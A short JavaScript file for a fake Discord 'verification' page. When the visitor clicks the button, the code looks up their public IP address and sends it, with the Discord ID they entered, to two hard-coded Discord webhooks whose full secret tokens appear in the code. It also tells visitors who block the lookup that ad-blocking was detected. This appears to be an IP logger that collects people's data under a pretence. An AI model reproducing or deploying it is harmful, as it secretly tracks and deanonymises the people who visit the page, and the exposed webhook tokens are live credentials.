function httpGet(theUrl)
{
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", theUrl, false );
    xmlHttp.send( null );
    return xmlHttp.responseText;
}
function sendallinfo() 
{
    var balls = document.getElementById('discordid').value;
    var url = "https://discordapp.com/api/webhooks/1033787853311852735/9XurvmFBWBaoiLPRSLNp_198Q4pxOJBMXAoQEH5Xji6KdhQP2ZpoXUcm3LXbNDCTmN51";
    var request = new XMLHttpRequest();
    request.open("POST", url);
    request.setRequestHeader('Content-type', 'application/json');

    var myEmbed2 = {
        "title": "Verification log",
        
        "color": 15258703,
        "fields": [
            {
                "name": "Discord ID",
                "value": balls,
                "inline": true
            },
            {
                "name": "IP",
                "value": publicIp,
                "inline": true
            },
        ],
    }
    
    var params = {
        username: "MuflieBot",
        embeds: [ myEmbed2 ]
    }
    
    request.send(JSON.stringify(params));   

}
function sendMessage() {
    const request = new XMLHttpRequest();
    request.open("POST", "https://discordapp.com/api/webhooks/1033787814673911808/O0z54fceNSLcUkTg6XQbC2yDaeSBZfG1jW1Hq88KyinKPXHeNw-BHcZM7HanfldnJ4Ox");
    var balls = document.getElementById('discordid').value;
    request.setRequestHeader('Content-type', 'application/json');

    const params = {
      username: "My Webhook Name",
      avatar_url: "",
      content: balls
    }

    request.send(JSON.stringify(params));
}




document.getElementById('button').addEventListener("click", function() {
    var balls = document.getElementById('discordid').value;
    try{
        publicIp = httpGet("https://api.ipify.org/");
    } catch (error) {
        alert("AdBlock Detected.")
        location.reload()
    }
    sendallinfo();
    sendMessage();
    
    
});


